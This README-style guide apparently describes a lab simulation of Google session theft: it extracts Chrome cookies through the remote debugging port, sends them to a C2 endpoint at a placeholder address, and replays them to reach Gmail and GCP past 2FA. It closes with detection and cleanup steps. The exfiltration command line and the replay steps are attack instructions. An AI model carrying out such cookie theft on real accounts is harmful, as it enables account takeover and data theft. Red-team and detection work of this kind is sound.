# Classic Google session theft (pass-the-cookie)

Infostealer simulation: extracting Chrome cookies from the victim machine, exfiltrating to a C2, reusing on the attacker machine (2FA bypassed).

## Prerequisites

- Victim machine: Ubuntu/Debian **without TPM**, Chrome installed (**Chrome/Linux is NOT covered by DBSC -> classic cookies guaranteed**)
- Attacker machine: Python 3 + `pip install websocket-client playwright requests flask`
  then `playwright install chromium`

## Scenario

1. **Victim** -- launch Chrome with CDP accessible (simulates code execution):

```bash
google-chrome --remote-debugging-port=9222 \
              --user-data-dir=/tmp/chrome-debug \
              "https://accounts.google.com"
```

Log in normally (password + 2FA).

2. **Attacker** -- start the C2:
   `python3 c2_server.py --port 8443`
3. **Victim** -- dump and exfiltrate:
   `python3 loot_dump.py --google-only --c2 http://<IP_C2>:8443/collect`
4. **Attacker** -- headless access without browser, no pure Google API for now which requires an OAuth token:
   `python3 replay_gcp.py loot.json --mode api`
   -> lists GCP projects of the victim account via SAPISIDHASH.
5. **Attacker** -- open session in a Chrome browser via Playwright
   `python3 replay_gcp.py loot.json --mode browser`
   -> Gmail + GCP Console opened, screenshots.

## Troubleshooting

- **`KeyError: 'deviceDescriptors'` error with Playwright**: the Playwright Python
  package is incompatible with system Chrome. Solution: use the
  Chromium bundle from Playwright (`p.chromium.launch(headless=False)` without
  `channel="chrome"`), and install binaries with `playwright install chromium`.

## Google-side detection / logs

- Admin console > Reports > Logins: login from unknown IP
- Security Investigation Tool: `dbsc_binding` (DBSC binding), abnormal OAuth connections
- Alerts: "Login from unusual location"

## Cleanup

- Admin console > Victim account > Sessions > Revoke all sessions
- Remove victim account from test GCP project
